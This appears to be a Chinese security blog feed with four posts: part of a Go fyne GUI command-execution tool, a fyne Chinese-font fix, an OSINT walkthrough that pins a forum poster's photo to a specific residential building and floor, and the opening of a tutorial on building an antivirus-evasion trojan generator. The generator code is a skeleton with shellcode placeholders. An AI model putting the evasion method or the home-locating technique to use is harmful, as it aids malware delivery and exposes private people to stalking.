<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> command</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"io/ioutil"</span></span><br><span class="line">	<span class="string">"log"</span></span><br><span class="line">	<span class="string">"os/exec"</span></span><br><span class="line">	<span class="string">"runtime"</span></span><br><span class="line">	<span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">tips</span><span class="params">()</span> <span class="params">(tip <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	timeUnix := time.Now().Unix() <span class="comment">//已知的时间戳</span></span><br><span class="line">	formatTimeStr := time.Unix(timeUnix, <span class="number">0</span>).Format(<span class="string">"2006-01-02 15:04:05"</span>)</span><br><span class="line"></span><br><span class="line">	tip = <span class="keyword">string</span>(<span class="string">"操作系统："</span> + runtime.GOOS + <span class="string">"\n"</span> +</span><br><span class="line">		<span class="string">"系统架构："</span> + runtime.GOARCH + <span class="string">"\n"</span> +</span><br><span class="line">		<span class="string">"系统时间："</span> + formatTimeStr + <span class="string">"\n"</span> +</span><br><span class="line">		<span class="string">"\n"</span>)</span><br><span class="line">	<span class="keyword">return</span> tip</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ExecForSys</span><span class="params">(cmdin <span class="keyword">string</span>)</span> <span class="params">(output <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> tips() + osExec(cmdin)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">osExec</span><span class="params">(cmdin <span class="keyword">string</span>)</span> <span class="params">(output <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> cmds []<span class="keyword">string</span></span><br><span class="line">	cmdinPrefix := <span class="string">""</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> runtime.GOOS &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">"darwin"</span>:</span><br><span class="line">		<span class="keyword">fallthrough</span></span><br><span class="line">	<span class="keyword">case</span> <span class="string">"linux"</span>:</span><br><span class="line">		cmds = <span class="built_in">append</span>(cmds, <span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>)</span><br><span class="line">	<span class="keyword">case</span> <span class="string">"windows"</span>:</span><br><span class="line">		cmds = <span class="built_in">append</span>(cmds, <span class="string">"cmd"</span>, <span class="string">"/c"</span>)</span><br><span class="line">		cmdinPrefix = <span class="string">"chcp 65001 &amp;&amp; "</span></span><br><span class="line">	&#125;</span><br><span class="line">	cmds = <span class="built_in">append</span>(cmds, cmdinPrefix+cmdin)</span><br><span class="line">	c := exec.Command(cmds[<span class="number">0</span>], cmds[<span class="number">1</span>:]...)</span><br><span class="line">	<span class="comment">// 获取输出对象，可以从该对象中读取输出结果</span></span><br><span class="line">	stdout, err := c.StdoutPipe()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 运行命令</span></span><br><span class="line">	<span class="keyword">if</span> err := c.Start(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line">	outputBytes, _ := ioutil.ReadAll(stdout)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">string</span>(outputBytes)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="五：整体效果"><a href="#五：整体效果" class="headerlink" title="五：整体效果"></a>五：整体效果</h3><p>以上整体的框架所展示的效果如下。各位可以根据该篇思路来编写自己的工具形成武器库扩展。<br><img src="https://i.loli.net/2021/08/16/XqoGjIKCUlVv28k.png" alt="image-4.png"></p>
<h3 id="六：思考"><a href="#六：思考" class="headerlink" title="六：思考"></a>六：思考</h3><p>在该篇文章中，主要体现fyne的使用方法和设计思路。关于执行命令的模块编写只是一个引子，该执行本地命令模块个人觉得没啥卵用，各位可以抛砖引玉应用到POC验证、EXP利用等方面会有更好的效果。另外我也在思考如何将执行本地命令模块拆分成含有服务端、用户端、agent端的C2式模块框架，目前还在研究当中…<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
]]></content>
  </entry>
  <entry>
    <title>Golang fyne库中文修复方案</title>
    <url>/2021/08/09/Golang%20fyne%E5%BA%93%E4%B8%AD%E6%96%87%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>最近一直在学习GO语言，突发奇想想尝试GO的GUI开发，找了关于GUI的适用性和开发难度都比较适宜的库做对比发现还是fyne好一点。以下为关于GO语言GUI库的归档，参考：<a href="https://github.com/jobbole/awesome-go-cn/#gui" target="_blank" rel="noopener">https://github.com/jobbole/awesome-go-cn/#gui</a><br></p><a id="more"></a>
<p><img src="https://i.loli.net/2021/08/16/o4afp9kHFVPceGs.png" alt="image.png"></p>
<h3 id="fyne安装"><a href="#fyne安装" class="headerlink" title="fyne安装"></a>fyne安装</h3><p>首先需要检查GOPATH，若GOPATH不是当前项目的目录则需要修改一下<br>临时修改方法：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">export GOPATH=<span class="string">"/Users/xxxxx/GoProjects/fynetest"</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/08/16/wR4rcLTIKxouJdG.png" alt="image-1.png"><br>随后开始安装<br>使用git上的方法安装v2版本的fyne（需要终端挂上代理），当src目录出现完整的fyne库文件才算下载好。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> get fyne.io/fyne/v2</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/08/16/lmLH6cMUpXPQF4N.png" alt="image-2.png"></p>
<h3 id="fyne-demo"><a href="#fyne-demo" class="headerlink" title="fyne_demo"></a>fyne_demo</h3><p>采用Github上的示例demo代码做简单演示</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"fyne.io/fyne/v2/app"</span></span><br><span class="line">	<span class="string">"fyne.io/fyne/v2/container"</span></span><br><span class="line">	<span class="string">"fyne.io/fyne/v2/widget"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	a := app.New()</span><br><span class="line">	w := a.NewWindow(<span class="string">"Hello"</span>)</span><br><span class="line"></span><br><span class="line">	hello := widget.NewLabel(<span class="string">"Hello Fyne!"</span>)</span><br><span class="line">	w.SetContent(container.NewVBox(</span><br><span class="line">		hello,</span><br><span class="line">		widget.NewButton(<span class="string">"Hi!"</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">			hello.SetText(<span class="string">"Welcome :)"</span>)</span><br><span class="line">		&#125;),</span><br><span class="line">	))</span><br><span class="line"></span><br><span class="line">	w.ShowAndRun()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>go run运行之后即可看到一个简单的窗口。<br><img src="https://i.loli.net/2021/08/16/oRqcNZHVgUMjPJh.png" alt="image-3.png"><br>由于需求原因，想写一个中文的GUI界面，在尝试将几个关键字修改为中文之后发现程序出现乱码。<br><img src="https://i.loli.net/2021/08/16/3UL8eWkQbFDvEXx.png" alt="image-4.png"></p>
<h3 id="修复中文问题"><a href="#修复中文问题" class="headerlink" title="修复中文问题"></a>修复中文问题</h3><h4 id="方法一：引入系统字体设置成环境变量"><a href="#方法一：引入系统字体设置成环境变量" class="headerlink" title="方法一：引入系统字体设置成环境变量"></a>方法一：引入系统字体设置成环境变量</h4><p>首先通过遍历系统字体库来查找合适的字体文件<br>示例代码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"github.com/flopp/go-findfont"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fontPaths := findfont.List()</span><br><span class="line">	<span class="keyword">for</span> _, path := <span class="keyword">range</span> fontPaths &#123;</span><br><span class="line">		fmt.Println(path)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注：该方式需要引入github.com/flopp/go-findfont库，需要自行下载该库<br>运行后可以发现终端输出了很多字体文件的路径<br><img src="https://i.loli.net/2021/08/16/qixJsKQlkLH8yM2.png" alt="image-5.png"><br>通过对比寻找发现在mac上”/System/Library/Fonts/STHeiti Medium.ttc”字体库适用于中文窗体<br>windows上同理，可找到”simkai.ttf”字体库<br>随后修改程序代码，添加”os.Setenv()”设置环境变量，代码如下:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"fyne.io/fyne/v2/app"</span></span><br><span class="line">	<span class="string">"fyne.io/fyne/v2/container"</span></span><br><span class="line">	<span class="string">"fyne.io/fyne/v2/widget"</span></span><br><span class="line">	<span class="string">"os"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	os.Setenv(<span class="string">"FYNE_FONT"</span>, <span class="string">"/System/Library/Fonts/STHeiti Medium.ttc"</span>) <span class="comment">//设置字体环境</span></span><br><span class="line">	a := app.New()</span><br><span class="line">	w := a.NewWindow(<span class="string">"Hello"</span>)</span><br><span class="line"></span><br><span class="line">	hello := widget.NewLabel(<span class="string">"Fyne测试1"</span>)</span><br><span class="line">	w.SetContent(container.NewVBox(</span><br><span class="line">		hello,</span><br><span class="line">		widget.NewButton(<span class="string">"点击!"</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">			hello.SetText(<span class="string">"Welcome :)"</span>)</span><br><span class="line">		&#125;),</span><br><span class="line">	))</span><br><span class="line"></span><br><span class="line">	w.ShowAndRun()</span><br><span class="line">	os.Unsetenv(<span class="string">"FYNE_FONT"</span>) <span class="comment">//取消环境变量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<p>需要注意的是在程序末尾要添加”os.Unsetenv(“FYNE_FONT”)”取消环境变量。<br>运行代码即可看到程序已正常显示中文<br><img src="https://i.loli.net/2021/08/16/EAmSaJNz1VRMy8W.png" alt="image.png"><br>但是该方法存在一个问题就是当跨平台时可能存在找不到字体文件而导致字体依旧乱码。该方法适合调试时使用，不适合编译后跨平台使用。</p>
<h4 id="方法二：将字体文件编译进程序"><a href="#方法二：将字体文件编译进程序" class="headerlink" title="方法二：将字体文件编译进程序"></a>方法二：将字体文件编译进程序</h4><p>首先需要下载阿里巴巴普惠体文件Alibaba-PuHuiTi-Medium.ttf以及fyne官方cmd工具，见文末附件<br>先将普惠字体文件转换成go文件</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">fyne bundle Alibaba-PuHuiTi-Medium.ttf &gt; bundle.<span class="keyword">go</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/08/16/OHjebgi6Gm3Xa9n.png" alt="image-1.png"><br>检查bundle.go文件发现是将字体文件转换成二进制并定义resourceAlibabaPuHuiTiMediumTtf调用<br><img src="https://i.loli.net/2021/08/16/ObEq9dN265MY3LX.png" alt="image-2.png"><br>修改bundle.go中package包名为theme，新建一个theme目录并且在其中新建theme.go文件<br><img src="https://i.loli.net/2021/08/16/pIUKwxomhLOVCta.png" alt="image-3.png"><br>theme.go代码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> theme</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"fyne.io/fyne/v2"</span></span><br><span class="line">	<span class="string">"fyne.io/fyne/v2/theme"</span></span><br><span class="line">	<span class="string">"image/color"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> MyTheme <span class="keyword">struct</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _ fyne.Theme = (*MyTheme)(<span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m MyTheme)</span> <span class="title">Font</span><span class="params">(s fyne.TextStyle)</span> <span class="title">fyne</span>.<span class="title">Resource</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> ResourceAlibabaPuHuiTiMediumTtf <span class="comment">//ResourceSourceHanSansTtf 即是 bundle.go 文件中 var 的变量名</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*MyTheme)</span> <span class="title">Color</span><span class="params">(n fyne.ThemeColorName, v fyne.ThemeVariant)</span> <span class="title">color</span>.<span class="title">Color</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> theme.DefaultTheme().Color(n, v)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*MyTheme)</span> <span class="title">Icon</span><span class="params">(n fyne.ThemeIconName)</span> <span class="title">fyne</span>.<span class="title">Resource</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> theme.DefaultTheme().Icon(n)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*MyTheme)</span> <span class="title">Size</span><span class="params">(n fyne.ThemeSizeName)</span> <span class="title">float32</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> theme.DefaultTheme().Size(n)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注：theme.go 中ResourceAlibabaPuHuiTiMediumTtf会报红，但是不影响编译运行<br>随后在main.go窗体程序运行过程中引入中文字体主题的theme.go代码，在头文件中也需要导入theme包，完整代码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"./theme"</span><span class="comment">//导入theme包</span></span><br><span class="line">	<span class="string">"fyne.io/fyne/v2/app"</span></span><br><span class="line">	<span class="string">"fyne.io/fyne/v2/container"</span></span><br><span class="line">	<span class="string">"fyne.io/fyne/v2/widget"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	a := app.New()</span><br><span class="line">	a.Settings().SetTheme(&amp;theme.MyTheme&#123;&#125;)<span class="comment">//引入中文主题</span></span><br><span class="line">	w := a.NewWindow(<span class="string">"Hello"</span>)</span><br><span class="line"></span><br><span class="line">	hello := widget.NewLabel(<span class="string">"Fyne测试1"</span>)</span><br><span class="line">	w.SetContent(container.NewVBox(</span><br><span class="line">		hello,</span><br><span class="line">		widget.NewButton(<span class="string">"点击!"</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">			hello.SetText(<span class="string">"Welcome :)"</span>)</span><br><span class="line">		&#125;),</span><br><span class="line">	))</span><br><span class="line"></span><br><span class="line">	w.ShowAndRun()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>go build编译程序并运行，程序即正常显示中文。<br><img src="https://i.loli.net/2021/08/16/Gd2bNope1XFzscf.png" alt="image-4.png"><br>该方法适合编译跨平台程序使用，但是有个不足是因为将字体文件（大小24M）编译进程序的原因，所以编译一个简单的程序都会有24M体积。<br>以上两种方式各有各的好处，根据需求取舍。</p>
<h3 id="思考："><a href="#思考：" class="headerlink" title="思考："></a>思考：</h3><p>写完这篇文章的时候突然想到可以根据第一种方法的扩展，那就是先找好win、mac、linux等自己需要跨平台系统上字体文件的具体路径，然后使用runtime.GOOS判断操作系统类型，根据类型调用相应的字体文件来达到不需要将字体文件编译进程序即可正常显示中文字体的目的，并且还减少了因字体文件过大导致程序也相应过大的问题。</p>
]]></content>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>图像情报挖掘 - 简单练习</title>
    <url>/2021/07/28/%E5%9B%BE%E5%83%8F%E6%83%85%E6%8A%A5%E6%8C%96%E6%8E%98%20-%20%E7%AE%80%E5%8D%95%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<p>在贴吧偶然看到一个吧友发出求照片位置的帖子，贴文如下：<br><img src="https://i.loli.net/2021/08/16/PfgoxcYR1WpLaez.png" alt="image.png"><br>所给信息已有</p><a id="more"></a>
<ul>
<li>拍摄城市在重庆</li>
<li>图片中泥黄色河流为嘉陵江</li>
<li>发帖时间为2021年7月26日下午15点48分</li>
</ul>
<p>再瞧瞧这张图片中有什么信息，原图如下：<br><img src="https://i.loli.net/2021/08/16/sKWU6nVQEBcLRov.jpg" alt="f04bb2a1cd11728bae092794dffcc3cec3fd2c2f.jpg"><br>1、我们可以看到一个很明显的标志性信号塔及一个存在圆顶的建筑。由于楼顶的大字招牌模糊不清，所以暂不考虑，但可以确定的是为4个字<br><img src="https://i.loli.net/2021/08/16/C2birLIdgRYMDpH.png" alt="image.png"><br>2、一条地铁和一条沿江公路<br><img src="https://i.loli.net/2021/08/16/SP9Mm6rGWuLnlh8.png" alt="image.png"><br>PS：起初以为下面那条沿江公路也是地跌线路，因为中间有一部分很像是地铁（箭头左边一点），但是放大细看并不是。并且图中有很多红蓝色素块干扰，导致不细看的话就会产生误导。<br>原因如下：<br>1）、红蓝色素块<br>放大图片到一定程度，我们可以发现图片中存在许多红蓝色素块，这是由于受强光（如太阳反光）或其他环境因素影响，使得摄像头内的 cmos 传感器受损，轻则影响成像，出现坏点，所以应当排除红蓝色素块影响。参考：<a href="https://www.gjy5.com/article/381.html" target="_blank" rel="noopener">https://www.gjy5.com/article/381.html</a><br></p>
<p><img src="https://i.loli.net/2021/08/16/miT7p548sbV9wER.png" alt="image-1.png"><br>2）、车辆<br>在同方向道路上，若真为地铁线路，那为何会有汽车、公交等车辆出现<br></p>
<p><img src="https://i.loli.net/2021/08/16/qAPc4VE8pj7WvdH.png" alt="image-2.png"><br>综上两点，断定这条路为公路，不为地铁线路<br>3、拍摄者所在楼前有一个相对低矮的楼，且存在突出的圆形阳台<br></p>
<p><img src="https://i.loli.net/2021/08/16/tbRcPCH9qySIJEg.png" alt="image-3.png"><br>4、图中有一大片绿色树林，猜测大致为公园类<br></p>
<p><img src="https://i.loli.net/2021/08/16/EJOBgj8AS4zmYMX.png" alt="image.png"><br>所有能看出来的信息大致为以上4点，下面开始找位置。<br>首先使用百度地图，搜索“重庆市嘉陵江”。搜索结果存在很多，我们需要沿着这条江结合地图一路找下去。<br></p>
<p><img src="https://i.loli.net/2021/08/16/Ng7MzqkblInQdX8.png" alt="image-1.png"><br>点开第一个位置，巧合的是，这个位置刚好有一个公园和一个地铁线路<br></p>
<p><img src="https://i.loli.net/2021/08/16/FlTu1izvkqVGaW2.png" alt="image-2.png"><br>点开全景地图去看实地场景，emmmmmm<br></p>
<p><img src="https://i.loli.net/2021/08/16/2z87FeJ5MjIA1Y3.png" alt="image-3.png"><br>居然就是我们要找的目标。信号塔，地铁线路和沿江公路都对的上。<br>调转角度，看向正后方，发现是一个小区，而这个小区便是拍摄者所在的位置。<br></p>
<p><img src="https://i.loli.net/2021/08/16/Whz5vOx92SNFADQ.png" alt="image.png"><br>使用普通地图，发现该小区叫做“金砂水岸”。<br></p>
<p><img src="https://i.loli.net/2021/08/16/67Swzq2XUDdThA9.png" alt="image-1.png"><br>但是这个小区有前面3栋矮楼，和后面3栋高一点的楼，哪个才是拍摄者的具体位置呢？<br></p>
<p><img src="https://i.loli.net/2021/08/16/yJ7A9nOrcoLeq4Y.png" alt="image-2.png"><br>回到原来的拍摄者图片，发现信号塔（大致上）处于图片的正中间位置，所以可以知道拍摄者的手机一定是正对着信号塔的。（手画的，将就着看吧，红色是想象中的手机）<br></p>
<p><img src="https://i.loli.net/2021/08/16/TBOCbzENjwtDoWv.png" alt="image-3.png"><br>我们只要以信号塔和某个正中间绿线上的点画一条射线，即可找到拍摄者所在的楼。<br>仔细在图中寻找，可以找到一个白色的柱子也同在绿色中间线上<br></p>
<p><img src="https://i.loli.net/2021/08/16/hJMs9H7B48y2WR1.png" alt="image-4.png"><br>找到了这两个点，剩下就开始在地图上标点划线即可。<br>根据信号塔处在山顶的特征，很快就在卫星地图上找到了信号塔，并且发现旁边确实存在一个圆顶型建筑（卫星地图为俯视图，若看不出来信号塔，可以将图片旋转180度）<br> </p>
<p><img src="https://i.loli.net/2021/08/16/IjPEKxJRdhHYbCD.png" alt="image.png"><br>关于白色柱子直接用俯视图看肯定是不直观的，因为它有可能是一个点状，我们可以看到原图中白色柱子右边有一个左边矮右边呈阶梯状的楼。<br></p>
<p><img src="https://i.loli.net/2021/08/16/QunmhEVWBDMXjFv.png" alt="image-1.png"><br>在卫星地图上寻找到了符合这个特征的“畔江楼小区”，而右边的两个阴影部分很有可能是我们所需要的“白柱子”。<br></p>
<p><img src="https://i.loli.net/2021/08/16/5fV32WDeLUjawNi.png" alt="image-2.png"><br>用全景地图查看，发现应该就是靠右边的这个了。<br></p>
<p><img src="https://i.loli.net/2021/08/16/bULhj7CcFVBRvOY.png" alt="image-3.png"><br>标号点划线发现恰好穿过2栋楼<br></p>
<p><img src="https://i.loli.net/2021/08/16/YTP67xf9mlkyjrZ.png" alt="image.png"><br>把图像放大稍作标记，如下图所示。拍摄者应该就是在第6栋了，而他照片里的矮楼就应该是第3栋了<br></p>
<p><img src="https://i.loli.net/2021/08/16/2KfDCpyRzgmq5eH.png" alt="image-1.png"><br>用全景地图看如下，突出的圆形阳台也同样符合拍摄者的照片<br></p>
<p><img src="https://i.loli.net/2021/08/16/jZALoeEzDOyRVr8.png" alt="image-2.png"><br>使用搜索引擎搜索“重庆 金砂水岸第6栋户型图”<br></p>
<p><img src="https://i.loli.net/2021/08/16/5QehBcRCpAJGm1v.png" alt="image-3.png"><br>可以看到有几条结果，其结果中均为房源信息。<br>仔细检索每条信息发现，金砂水岸楼层分别是18层、25层、31、32层等等<br></p>
<p><img src="https://i.loli.net/2021/08/16/COdesWfkm9t6Dou.png" alt="image.png"><br></p>
<p><img src="https://i.loli.net/2021/08/16/k2JNATusQBCH6pd.png" alt="image-1.png"><br></p>
<p><img src="https://i.loli.net/2021/08/16/6qk7oWsDQlxcyBH.png" alt="image-2.png"></p>
<p>最高的就不用管了，我们只需要看哪个楼层符合“第3栋”楼层，打开全景地图找个清晰的角度查看“第3栋”楼，大致数了一下肯定超过18层楼。那暂且给他按个25层的帽子吧。<br></p>
<p><img src="https://i.loli.net/2021/08/16/Av3nr5Wxf1upZ6b.png" alt="image-3.png"><br>而拍摄者的照片可以看到一定高于“第3栋”楼，那么拍摄者所处的位置应该为25层往上。（感觉快到顶楼了）<br></p>
<p><img src="https://i.loli.net/2021/08/16/EF56PlVeUtqCIkJ.png" alt="image-4.png"><br><br><br><br><br><br><br><br><br></p>
]]></content>
      <tags>
        <tag>情报</tag>
      </tags>
  </entry>
  <entry>
    <title>从0到1编写免杀生成器</title>
    <url>/2021/07/23/%E4%BB%8E0%E5%88%B01%E7%BC%96%E5%86%99%E5%85%8D%E6%9D%80%E7%94%9F%E6%88%90%E5%99%A8/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>免杀生成器的用途旨在攻防对抗中快速生成符合环境需求的免杀木马，减少因更换shellcode、加密方式或免杀方式被记录特征等因素而需从源码上进行修改编译的时间、学习成本。遂编写一款属于自己的免杀生成器形成自己的武器库是一件十分有意义的事情。<br></p><a id="more"></a>
<h3 id="倒着走"><a href="#倒着走" class="headerlink" title="倒着走"></a>倒着走</h3><h4 id="一、免杀源码"><a href="#一、免杀源码" class="headerlink" title="一、免杀源码"></a>一、免杀源码</h4><p>免杀的源码网上有很多，源码中大致分为几块：shellcode、反沙箱、混淆加密方式、执行方式。<br>此处以C++源码为例：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> ....</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">"shellcode"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">    		反沙箱代码</span><br><span class="line">                </span><br><span class="line">            混淆加密方式</span><br><span class="line">                </span><br><span class="line">            执行方式</span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>网上有很多大佬们都分享过自己的思路，可以针对这几部分内容针对性的做自己需要的修改，此处不细讲。<br>参考：<br><a href="https://www.ired.team/" target="_blank" rel="noopener">https://www.ired.team/</a><br><a href="https://idiotc4t.com/" target="_blank" rel="noopener">https://idiotc4t.com/</a><br></p>
<h4 id="二、编译源码"><a href="#二、编译源码" class="headerlink" title="二、编译源码"></a>二、编译源码</h4><p>有了C++免杀源码，那在平常项目中也可以使用Visual Studio或其他方式进行编译，但这不是本文本意。所以我们需要用C#写一个免杀生成器的框架，在后续使用中即可直接生成所需要配置的免杀木马。<br>为什么用C#而不用C++编写框架？第一是因为C#上手要比C++快（个人觉得），代码没有C++那么复杂，学习成本低。第二是因为在微软的文档中并未找到关于在程序中对C++代码编译的实现，所以编译C++免杀源码时依旧需要使用GCC。第三是如果后续对于免杀方式的源码类型有新的需求，例如除C++语言的免杀源码外还想加入C#语言的免杀源码时，正好可以使用微软已经实现的CSharpCodeProvider类来方便C#代码编译操作。没错[破涕为笑]，微软实现了C#代码的编译，但是没实现C++的。。。<br><br><img src="https://i.loli.net/2021/08/16/ilq3p5AP6QVOdwI.png" alt="image.png"><br></p>
<p><img src="https://i.loli.net/2021/08/16/UOehQiJmVbTNYDx.png" alt="image-1.png"><br><br>对于在C#程序中调用gcc编译C++代码，我们可以先将C++代码写一个类里，如下C#代码：</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//CPP_Direct.cs</span></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">CPP_Direct</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">string</span> Base_Code = <span class="string">@"</span></span><br><span class="line"><span class="string">#include ....</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">unsigned char buf[] = "</span>shellcode<span class="string">";</span></span><br><span class="line"><span class="string">int main()</span></span><br><span class="line"><span class="string">		&#123;</span></span><br><span class="line"><span class="string">    		反沙箱代码</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">            混淆加密方式</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">            执行方式</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">			return 0;</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        "</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>需要注意的是使用@符号时，2个双引号在输出时候等价于1个双引号，即@”….”;内的代码（C++/C#源代码）要把单引号再加一个单引号进行转义，另外比如shellcode段可以用两个花括号括起来，以便后面替换数据。修改后的代码如下：</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">.....</span><br><span class="line">    </span><br><span class="line">unsigned <span class="keyword">char</span> buf[] = <span class="string">""</span>&#123;&#123;shellcode&#125;&#125;<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">.....</span><br></pre></td></tr></table></figure>
<p>编译的代码是使用命令行调用GCC/C++来编译，示例如下：</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//common.cs</span></span><br><span class="line"><span class="comment">//执行系统命令</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">string</span> <span class="title">Execute_Cmd</span>(<span class="params"><span class="keyword">string</span> cmd</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="keyword">string</span> output = <span class="string">""</span>;</span><br><span class="line">            System.Diagnostics.Process p = <span class="keyword">new</span> System.Diagnostics.Process();</span><br><span class="line">            p.StartInfo.FileName = <span class="string">"cmd.exe"</span>;</span><br><span class="line">            p.StartInfo.UseShellExecute = <span class="literal">false</span>;    <span class="comment">//是否使用操作系统shell启动</span></span><br><span class="line">            p.StartInfo.RedirectStandardInput = <span class="literal">true</span>;<span class="comment">//接受来自调用程序的输入信息</span></span><br><span class="line">            p.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;<span 